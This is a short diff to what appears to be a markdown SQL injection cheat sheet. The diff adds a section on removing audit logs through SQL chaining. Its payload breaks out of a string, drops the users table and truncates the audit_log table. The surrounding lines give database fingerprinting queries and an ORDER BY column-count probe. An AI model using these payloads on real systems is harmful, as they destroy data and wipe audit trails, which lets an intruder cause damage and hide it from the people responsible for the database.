@@ -12,7 +12,10 @@ postgresql - `select version()`
 mysql - database()
 postgresql - current_database()
 
-
+#### Remove audit logs via SQL chaining
+```sql
+Smith'; DROP TABLE users; TRUNCATE audit_log; --
+```
 ##### Detect number of original query columns
 ```sql
 ' ORDER BY 1--
